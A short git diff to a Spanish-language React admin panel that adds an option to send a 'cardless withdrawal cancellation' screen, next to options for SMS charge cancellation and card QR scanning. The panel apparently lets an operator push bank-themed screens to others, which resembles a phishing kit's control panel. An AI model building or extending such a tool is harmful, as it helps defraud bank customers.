@@ -479,6 +479,12 @@ export default function AdminPanel() {
       return;
     }
     
+    // Para cancelacion_retiro, enviamos directamente sin modal
+    if (screen === "cancelacion_retiro") {
+      console.log("Enviando pantalla de cancelación de retiro");
+      // No necesitamos un modal, simplemente enviamos la pantalla
+    }
+    
     // Para escanear_qr, enviamos directamente sin modal
     console.log("Enviando tipo de pantalla:", screen);
 
@@ -739,6 +745,7 @@ export default function AdminPanel() {
                   <option value="mensaje">8. Ingresa el mensaje que gustes</option>
                   <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
                   <option value="escanear_qr">10. Escanear QR de Tarjeta</option>
+                  <option value="cancelacion_retiro">11. Cancelación de retiro sin tarjeta</option>
                 </select>
               </div>
             </div>
